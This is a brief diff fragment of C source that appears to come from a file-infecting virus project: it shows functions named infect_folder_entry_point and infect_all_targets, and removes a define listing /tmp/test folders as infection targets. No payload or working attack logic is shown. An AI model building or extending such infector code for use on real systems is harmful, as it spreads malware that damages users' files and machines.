@@ -71,8 +71,6 @@ char                infect_folder_entry_point(char *self_name, const char *path)
     return (SUCCESS);
 }
 
-#define TARGETS     {"/tmp/test/", "/tmp/test2/", NULL}
-
 char                infect_all_targets(char *argv)
 {
     const char      *targets[] = TARGETS;
